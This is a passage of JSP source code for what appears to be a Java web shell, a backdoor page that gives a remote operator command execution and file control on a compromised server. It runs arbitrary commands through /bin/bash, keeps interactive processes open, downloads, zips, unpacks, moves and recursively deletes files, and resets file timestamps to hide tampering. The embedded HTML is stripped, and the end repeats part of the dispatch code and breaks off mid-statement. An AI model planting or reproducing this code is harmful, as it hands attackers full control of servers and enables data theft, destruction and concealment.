				out
						.println("
" + "
" + "
Set File Property »
" + "
Current File (FullPath)
\""

" + "
\"editProperty\"
 " + "
" + " 
Read " + " 
Write " + "

" + "
Instead »" + "year:" + "
								+ cal.get(Calendar.YEAR)								+ 
" + "month:" + "
								+ (cal.get(Calendar.MONTH) + 1)								+ 
" + "day:" + "
								+ cal.get(Calendar.DATE)								+ 
" + "" + "hour:" + "
								+ cal.get(Calendar.HOUR)								+ 
" + "minute:" + "
								+ cal.get(Calendar.MINUTE)								+ 
" + "second:" + "
								+ cal.get(Calendar.SECOND)								+ 
" + "

" + "
\"Submit\"
 
\"Back\"

" + "
" + "
");
			} catch (Exception e) {
				throw e;
			}
		}
	}

	private static class EditPropertyInvoker extends DefaultInvoker {
		public boolean doBefor
e() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				String f = request.getParameter("file");
				File file = new File(f);
				if (!file.exists())
					return;

				String year = request.getParameter("year");
				String month = request.getParameter("month");
				String date = request.getParameter("date");
				String hour = request.getParameter("hour");
				String minute = request.getParameter("minute");
				String second = request.getParameter("second");

				Calendar cal = Calendar.getInstance();
				cal.set(Calendar.YEAR, Integer.parseInt(year));
				cal.set(Calendar.MONTH, Integer.parseInt(month) - 1);
				cal.set(Calendar.DATE, Integer.parseInt(date));
				cal.set(Calendar.HOUR, Integer.parseInt(hour));
				cal.set(Calendar.MINUTE, Integer.parseInt(minute));
				cal.set(Calendar.SECOND, Integer.parseInt(second));
				if (file.setLastModified(cal.getTimeInMillis())) {
					JSession.setAttribute(MSG, "Reset File Property Success!");
				} else {
					JSession
							.setAttribute(MSG,
									"Reset File Property Failed!");
				}
				response.sendRedirect(SHELL_NAME);
			} catch (Exception e) {

				throw e;
			}
		}
	}

	//VShell
	private static class VsInvoker extends DefaultInvoker {
		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				PrintWriter out = response.getWriter();
				String cmd = request.getParameter("command");
				String program = request.getParameter("program");
				if (cmd == null) {
					cmd="";
				}
				if (program == null)
					program = "";
				if (JSession.getAttribute(MSG) != null) {
					Util.outMsg(out, JSession.getAttribute(MSG).toString());
					JSession.removeAttribute(MSG);
				}
				out
						.println(""
								+ "
" + "" + "
Execute Program »
" + "
" + "
\"shell\"
" + "
\"program\"
" + "Parameter
\""
" + "
\"Execute\"
" + "

" + "" + "
" + "
Execute Shell »
" + "
" + "
\"shell\"
" + "
\"command\"
" + "Parameter
\""
" + "
\"Execute\"
" + "

" + "
" + "
");
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class ShellInvoker extends DefaultInvoker {
		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				PrintWriter out = response.getWriter();
				String type = request.getParameter("type");
				if (type.equals("command")) {
					((Invoker) ins.get("vs")).invoke(request, response,
							JSession);
					out.println("
");
					out.println("
");
					String command = request.getParameter("command");
					if (!Util.isEmpty(command)) {
						String[] com2= new String[]{"/bin/bash", "-c", command};
						Process pro = Runtime.getRuntime().exec(com2);
						BufferedReader reader = new BufferedReader(
								new InputStre
amReader(pro.getInputStream()));
						String s = reader.readLine();
						while (s != null) {
							out.println(Util.htmlEncode(Util.getStr(s)));
							s = reader.readLine();
						}
						reader.close();
						reader = new BufferedReader(new InputStreamReader(pro.getErrorStream()));
						s = reader.readLine();
						while (s != null) {
							out.println(Util.htmlEncode(Util.getStr(s)));
							s = reader.readLine();
						}
						reader.close();
						out.println("
");
					}
				} else {
					String program = request.getParameter("program");
					if (!Util.isEmpty(program)) {
						Process pro = Runtime.getRuntime().exec(program);
						JSession.setAttribute(MSG, "Program Has Run Success!");
						((Invoker) ins.get("vs")).invoke(request, response,
								JSession);
					}
				}
			} catch (Exception e) {
				throw e;
			}
		}
	}

	private static class DownInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				String path = request.getParameter("path");
				if (Util.isEmpty(path))
					return;
				InputStream i = null;
				Object enter = JSession.getAttribute(ENTER);
				String fileName = null;
				if (enter == null) {
					File f = new File(path);
					if (!f.exists())
						return;
					fileName = f.getName();
					i = new FileInputStream(f);
				} else {
					ZipFile zf = new ZipFile((String) enter);
					ZipEntry entry = new ZipEntry(path);
					fileName = entry.getName().substring(
							entry.getName().lastIndexOf("/") + 1);
					i = zf.getInputStream(entry);
				}
				response.setHeader("Content-Disposition",
						"attachment;filename="
								+ URLEncoder.encode(fileName, PAGE_CHARSET));
				BufferedInputStream input = new BufferedInputStream(i);
				BufferedOutputStream output = new BufferedOutputStream(response
						.getOutputStream());
				byte[] data = new byte
[1024];
				int len = input.read(data);
				while (len != -1) {
					output.write(data, 0, len);
					len = input.read(data);
				}
				input.close();
				output.close();
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class IndexInvoker extends DefaultInvoker {
		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				((Invoker) ins.get("filelist")).invoke(request, response,
						JSession);
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class MkDirInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				String name = request.getParameter("name");
				File f = new File(name);
				if (!f.isAbsolute()) {
					String path = JSession.getAttribute(CURRENT_DIR).toString();
					if (!path.endsWith("/"))
						path += "/";
					path += name;
					f = new File(path);
				}
				f.mkdirs();
				JSession.setAttribute(MSG, "Make Directory Success!");
				response.sendRedirect(SHELL_NAME);
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class MoveInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				PrintWriter out = response.getWriter();
				String src = request.getParameter("src");
				String target = request.getParameter("to");
				if (!Util.isEmpty(target) && !Util.isEmpty(src)) {
					File file = new File(src);
					if (file.renameTo(new File(target))) {
						JSession.setAttribute(MSG, "Move File Success!");
					} else {
						String msg = "Move File Failed!";
						if (file.isDirectory()) {
							msg += "The Move Will Failed When The D
irectory Is Not Empty.";
						}
						JSession.setAttribute(MSG, msg);
					}
					response.sendRedirect(SHELL_NAME);
				}
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class RemoveDirInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				String dir = request.getParameter("dir");
				File file = new File(dir);
				if (file.exists()) {
					deleteFile(file);
					deleteDir(file);
				}

				JSession.setAttribute(MSG, "Remove Directory Success!");
				response.sendRedirect(SHELL_NAME);
			} catch (Exception e) {

				throw e;
			}
		}

		public void deleteFile(File f) {
			if (f.isFile()) {
				f.delete();
			} else {
				File[] list = f.listFiles();
				for (int i = 0; i < list.length; i++) {
					File ff = list[i];
					deleteFile(ff);
				}
			}
		}

		public void deleteDir(File f) {
			File[] list = f.listFiles();
			if (list.length == 0) {
				f.delete();
			} else {
				for (int i = 0; i < list.length; i++) {
					File ff = list[i];
					deleteDir(ff);
				}
				deleteDir(f);
			}
		}
	}

	private static class PackBatchInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				String files = request.getParameter("files");
				if (Util.isEmpty(files))
					return;
				String saveFileName = request.getParameter("savefilename");
				File saveF = new File(JSession.getAttribute(CURRENT_DIR)
						.toString(), saveFileName);
				if (saveF.exists()) {
					JSession.setAttribute(MSG, "The File \"" + saveFileName
							+ "\" Has Been Exists!");
					response.sendRedirect(SHELL_NAME);
					return;
				}
				ZipOutputStream zout = new ZipOutputStream(
						new 
BufferedOutputStream(new FileOutputStream(saveF)));
				String[] arr = files.split(",");
				for (int i = 0; i < arr.length; i++) {
					String f = arr[i];
					File pF = new File(JSession.getAttribute(CURRENT_DIR)
							.toString(), f);
					ZipEntry entry = new ZipEntry(pF.getName());
					zout.putNextEntry(entry);
					FileInputStream fInput = new FileInputStream(pF);
					int len = 0;
					byte[] buf = new byte[1024];
					while ((len = fInput.read(buf)) != -1) {
						zout.write(buf, 0, len);
						zout.flush();
					}
					fInput.close();
				}
				zout.close();
				JSession.setAttribute(MSG, "Pack Files Success!");
				response.sendRedirect(SHELL_NAME);
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class PackInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		private boolean config = false;
		private String extFilter = "blacklist";
		private String[] fileExts = null;
		private String sizeFilter = "no";
		private int filesize = 0;
		private String[] exclude = null;
		private String packFile = null;

		private void reset() {
			this.config = false;
			this.extFilter = "blacklist";
			this.fileExts = null;
			this.sizeFilter = "no";
			this.filesize = 0;
			this.exclude = null;
			this.packFile = null;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				String config = request.getParameter("config");
				if (!Util.isEmpty(config) && config.equals("true")) {
					this.config = true;
					this.extFilter = request.getParameter("extfilter");
					this.fileExts = request.getParameter("fileext").split(",");
					this.sizeFilter = request.getParameter("sizefilter");
					this.filesize = Integer.parseInt(request
							.getParameter("filesize"));
					this.exclude = request.getParameter("exclude").split(",");
				}
				String packedFile = request.getParameter("packedfile");
				if (Util.isEmpty(packedFile))
					ret
urn;
				this.packFile = packedFile;
				String saveFileName = request.getParameter("savefilename");
				File saveF = null;
				if (this.config)
					saveF = new File(saveFileName);
				else
					saveF = new File(JSession.getAttribute(CURRENT_DIR)
							.toString(), saveFileName);
				if (saveF.exists()) {
					JSession.setAttribute(MSG, "The File \"" + saveFileName
							+ "\" Has Been Exists!");
					response.sendRedirect(SHELL_NAME);
					return;
				}
				File pF = new File(packedFile);
				ZipOutputStream zout = null;
				String base = "";
				if (pF.isDirectory()) {
					if (pF.listFiles().length == 0) {
						JSession
								.setAttribute(MSG,
										"No File To Pack ! Maybe The Directory Is Empty .");
						response.sendRedirect(SHELL_NAME);
						this.reset();
						return;
					}
					zout = new ZipOutputStream(new BufferedOutputStream(
							new FileOutputStream(saveF)));
					zipDir(pF, base, zout);
				} else {
					zout = new ZipOutputStream(new BufferedOutputStream(
							new FileOutputStream(saveF)));
					zipFile(pF, base, zout);
				}
				zout.close();
				this.reset();
				JSession.setAttribute(MSG, "Pack File Success!");
				response.sendRedirect(SHELL_NAME);
			} catch (Exception e) {
				throw e;
			}
		}

		public void zipDir(File f, String base, ZipOutputStream zout)
				throws Exception {
			if (f.isDirectory()) {
				if (this.config) {
					String curName = f.getAbsolutePath().replace('\\', '/');
					curName = curName.replaceAll("\\Q" + this.packFile + "\\E",
							"");
					if (this.exclude != null) {
						for (int i = 0; i < exclude.length; i++) {
							if (!Util.isEmpty(exclude[i])
									&& curName.startsWith(exclude[i])) {
								return;
							}
						}
					}
				}
				File[] arr = f.listFiles();
				for (int i = 0; i < arr.length; i++) {
					File ff = arr[i];
					String tmpBase = base;
					if (!Util.isEmpty(tmpBase) && !tmpBase.endsWith("/"))
						tmpBase += "/";
					zipDir(ff, tmpBase + f.getName(), zout);
				}
			} else {
				String tmpBase = base;
				if (
!Util.isEmpty(tmpBase) && !tmpBase.endsWith("/"))
					tmpBase += "/";
				zipFile(f, tmpBase, zout);
			}

		}

		public void zipFile(File f, String base, ZipOutputStream zout)
				throws Exception {
			if (this.config) {
				String ext = f.getName().substring(
						f.getName().lastIndexOf('.') + 1);
				if (this.extFilter.equals("blacklist")) {
					if (Util.exists(this.fileExts, ext)) {
						return;
					}
				} else if (this.extFilter.equals("whitelist")) {
					if (!Util.exists(this.fileExts, ext)) {
						return;
					}
				}
				if (!this.sizeFilter.equals("no")) {
					double size = f.length() / 1024;
					if (this.sizeFilter.equals("greaterthan")) {
						if (size < filesize)
							return;
					} else if (this.sizeFilter.equals("lessthan")) {
						if (size > filesize)
							return;
					}
				}
			}
			ZipEntry entry = new ZipEntry(base + f.getName());
			zout.putNextEntry(entry);
			FileInputStream fInput = new FileInputStream(f);
			int len = 0;
			byte[] buf = new byte[1024];
			while ((len = fInput.read(buf)) != -1) {
				zout.write(buf, 0, len);
				zout.flush();
			}
			fInput.close();
		}
	}

	private static class UnPackInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				String savepath = request.getParameter("savepath");
				String zipfile = request.getParameter("zipfile");
				if (Util.isEmpty(savepath) || Util.isEmpty(zipfile))
					return;
				File save = new File(savepath);
				save.mkdirs();
				ZipFile file = new ZipFile(new File(zipfile));
				Enumeration e = file.entries();
				while (e.hasMoreElements()) {
					ZipEntry en = (ZipEntry) e.nextElement();
					String entryPath = en.getName();
					int index = entryPath.lastIndexOf("/");
					if (index != -1)
						entryPath = entryPath.substring(0, index);
					File absEntryFile = new File(save, entryPath);
					if
 (!absEntryFile.exists()
							&& (en.isDirectory() || en.getName().indexOf("/") != -1))
						absEntryFile.mkdirs();
					BufferedOutputStream output = null;
					BufferedInputStream input = null;
					try {
						output = new BufferedOutputStream(new FileOutputStream(
								new File(save, en.getName())));
						input = new BufferedInputStream(file.getInputStream(en));
						byte[] b = new byte[1024];
						int len = input.read(b);
						while (len != -1) {
							output.write(b, 0, len);
							len = input.read(b);
						}
					} catch (Exception ex) {
					} finally {
						try {
							if (output != null)
								output.close();
							if (input != null)
								input.close();
						} catch (Exception ex1) {
						}
					}
				}
				file.close();
				JSession.setAttribute(MSG, "UnPack File Success!");
				response.sendRedirect(SHELL_NAME);
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class TopInvoker extends DefaultInvoker {
		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				PrintWriter out = response.getWriter();
				out
						.println("
"
								+ ""
								+ "	"
								+ "		"
								+ "	"
								+ "	"
								+ "		" + "
v" + request.getHeader("host") + " (" + InetAddress.getLocalHost().getHostAddress() + ") | copy
Logout | " + " File Manager | " + " Execu te Command | " + "
");
				if (JSession.getAttribute(MSG) != null) {
					Util.outMsg(out, JSession.getAttribute(MSG).toString());
					JSession.removeAttribute(MSG);
				}
				if (JSession.getAttribute(ENTER_MSG) != null) {
					String outEntry = request.getParameter("outentry");
					if (Util.isEmpty(outEntry) || !outEntry.equals("true"))
						Util.outMsg(out, JSession.getAttribute(ENTER_MSG)
								.toString());
				}
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class OnLineInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				String type = request.getParameter("type");
				if (Util.isEmpty(type))
					return;
				if (type.toLowerCase().equals("start")) {
					String exe = request.getParameter("exe");
					if (Util.isEmpty(exe))
						return;
					Process pro = Runtime.getRuntime().exec(exe);
					ByteArrayOutputStream outs = new ByteArrayOutputStream();
					response.setContentLength(100000000);
					response.setContentType("text/html;charset="
							+ System.getProperty("file.encoding"));
					OnLineProcess olp = new OnLineProcess(pro);
					JSession.setAttribute(SHELL_ONLINE, olp);
					new OnLineConnector(new ByteArrayInputStream(outs
							.toByteArray()), pro.getOutputStream(),
							"exeOclientR", olp).start();
					new OnLineConnector(pro.getInputStream(), response
							.getOutputStream(), "exeRclientO", olp).start();
					new OnLineConnector(pro.getErrorStream(), response
							.getOutputStream(), "exeRclientO", olp).start();
					Thread.sleep(1000 * 60 * 60 * 24);
				} else if (type.equals("ecmd")) {
					Object o = JSession.getAttribute(SHELL_ONLINE);
					String cmd = request.getParameter("cmd");
					if (Util.isEmpty(cmd))
						return;
					if (o == null)
						return;
					OnLineProcess olp = (OnLineProcess) o;
		
			olp.setCmd(cmd);
				} else {
					Object o = JSession.getAttribute(SHELL_ONLINE);
					if (o == null)
						return;
					OnLineProcess olp = (OnLineProcess) o;
					olp.stop();
				}
			} catch (Exception e) {

				throw e;
			}
		}
	}

	static {
		ins.put("script", new ScriptInvoker());
		ins.put("before", new BeforeInvoker());
		ins.put("after", new AfterInvoker());
		ins.put("deleteBatch", new DeleteBatchInvoker());
		ins.put("vLogin", new VLoginInvoker());
		ins.put("login", new LoginInvoker());
		ins.put("filelist", new FileListInvoker());
		ins.put("logout", new LogoutInvoker());
		ins.put("upload", new UploadInvoker());
		ins.put("copy", new CopyInvoker());
		ins.put("bottom", new BottomInvoker());
		ins.put("vCreateFile", new VCreateFileInvoker());
		ins.put("vEdit", new VEditInvoker());
		ins.put("createFile", new CreateFileInvoker());
		ins.put("vEditProperty", new VEditPropertyInvoker());
		ins.put("editProperty", new EditPropertyInvoker());
		ins.put("vs", new VsInvoker());
		ins.put("shell", new ShellInvoker());
		ins.put("down", new DownInvoker());																		
		ins.put("index", new IndexInvoker());
		ins.put("mkdir", new MkDirInvoker());
		ins.put("move", new MoveInvoker());
		ins.put("removedir", new RemoveDirInvoker());
		ins.put("packBatch", new PackBatchInvoker());
		ins.put("pack", new PackInvoker());
		ins.put("unpack", new UnPackInvoker());
		ins.put("top", new TopInvoker());
		ins.put("online", new OnLineInvoker());
	}%>
<%
	try {
		String o = request.getParameter("o");
		if (Util.isEmpty(o)) {
			if (session.getAttribute(SESSION_O) == null)
				o = "index";
			else {
				o = session.getAttribute(SESSION_O).toString();
				session.removeAttribute(SESSION_O);
			}
		}
		Object obj = ins.get(o);
		if (obj == null) {
			response.sendRedirect(SHELL_NAME);
		} else {
			Invoker in = (Invoker) obj;
			if (in.doBefore()) {
				String path = request.getParameter("folder");
				if (!Util.isEmpty(path)
						&& session.getAttribute(ENTER) == null)
					session.setAttribute(CURRENT_DIR, path
);
				((Invoker) ins.get("before")).invoke(request, response,
						session);
				((Invoker) ins.get("script")).invoke(request, response,
						session);
				((Invoker) ins.get("top")).invoke(request, response,
						session);
			}
			in.invoke(request, response, session);
			if (!in.doAfter()) {
				return;
			} else {
				((Invoker) ins.get("bottom")).invoke(request, response,
						session);
				((Invoker) ins.get("after")).invoke(request, response,
						session);
			}
		}
	} catch (Exception e) {
		Object msg = session.getAttribute(MSG);
		if (msg != null) {
			Util.outMsg(out, (String) msg);
			session.removeAttribute(MSG);
		}
		if (e.toString().indexOf("ClassCastException") != -1) {
			Util.outMsg(out, MODIFIED_ERROR + BACK_HREF);
		}
		ByteArrayOutputStream bout = new ByteArrayOutputStream();
		e.printStackTrace(new PrintStream(bout));
		session.setAttribute(CURRENT_DIR, SHELL_DIR);
		Util.outMsg(out, Util
				.htmlEncode(new String(bout.toByteArray())).replaceAll(
						"\n", "
"), "left");
		bout.close();
		out.flush();
		((Invoker) ins.get("bottom"))
				.invoke(request, response, session);
		((Invoker) ins.get("after")).invoke(request, response, session);
	}
%>
 new MoveInvoker());
		ins.put("removedir", new RemoveDirInvoker());
		ins.put("packBatch", new PackBatchInvoker());
		ins.put("pack", new PackInvoker());
		ins.put("unpack", new UnPackInvoker());
		ins.put("top", new TopInvoker());
		ins.put("online", new OnLineInvoker());
	}%>
<%
	try {
		String o = request.getParameter("o");
		if (Util.isEmpty(o)) {
			if (session.getAttribute(SESSION_O) == null)
				o = "index";
			else {
				o = session.getAttribute(SESSION_O).toString();
				session.removeAttribute(SESSION_O);
			}
		}
		Object obj = ins.get(o);
		if (obj == null) {
			response.sendRedirect(SHELL_NAME);
		} else {
			Invoker in = (Invoker) obj;
			if (in.doBefore()) {
				String path = request.getParameter("folder");
				if (!Util.isEmpty(path)
						&& session.getAttribute(ENTER) == null)
					session.setAttribute(CURRENT_DIR, path
